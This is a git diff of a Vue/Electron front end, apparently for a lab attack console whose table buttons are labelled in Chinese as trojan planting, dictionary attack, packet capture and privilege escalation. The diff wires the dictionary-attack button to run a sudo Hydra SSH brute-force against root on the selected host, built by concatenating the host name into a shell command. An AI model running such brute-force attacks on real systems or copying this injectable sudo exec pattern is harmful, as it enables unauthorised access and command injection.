@@ -28,10 +28,10 @@
                 <q-td key="Transportable" :props="props">{{ props.row.Transportable }}</q-td>
                 <q-td key="operating" :props="props">
                 <q-btn-group push>
-                  <q-btn class="btn-table text-white" push label="植入木马" icon="verified_user" @click="handleTableClick(props.row)"/>
-                  <q-btn class="btn-table text-white" push label="字典攻击" icon="tune" @click="handleTableClick2(props.row)"/>
+                  <q-btn class="btn-table text-white" push label="植入木马" icon="bug_report" @click="handleTableClick(props.row)"/>
+                  <q-btn class="btn-table text-white" push label="字典攻击" icon="apps" @click="handleTableClick2(props.row)"/>
                   <q-btn class="btn-table text-white" push label="抓包分析" icon="tune" @click="handleTableClick3(props.row)"/>
-                  <q-btn class="btn-table text-white" push label="用户提权" icon="tune" @click="handleTableClick4(props.row)"/>
+                  <q-btn class="btn-table text-white" push label="用户提权" icon="settings_accessibility" @click="handleTableClick4(props.row)"/>
                 </q-btn-group>
                 </q-td>
               </q-tr>
@@ -85,6 +85,8 @@ import chartPie from '../../assets/js/echarts-1'
 import charts2Option from '../../assets/js/echarts-2'
 import { income, expense, total } from '../../assets/js/echarts-3'
 import chartZ from '../../assets/js/echarts-4'
+
+const exec = require('child_process').exec
 
 function wrapCsvValue (val, formatFn) {
   let formatted = formatFn !== undefined
@@ -185,12 +187,16 @@ export default {
       })
     },
     handleTableClick2 (e) {
-      this.$router.push({
-        path: 'table-detail',
-        query: {
-          id: e.name
-        }
-      })
+      console.log(e.name)
+      exec('sudo gnome-terminal -x bash -c "hydra -l root -P passlist.txt ' + e.name + ' ssh; exec bash"', { cwd: '/root/electron_APP/electron_test/攻击获权实验部署/攻击获权实验部署/hydra/thc-hydra-9.0/' },
+        function (error, stdout, stderr) {
+          if (error) {
+            console.error('error: ' + error)
+            return
+          }
+          console.log('stdout: ' + stdout)
+          console.log('stderr: ' + typeof stderr)
+        })
     },
     handleTableClick3 (e) {
       this.$router.push({
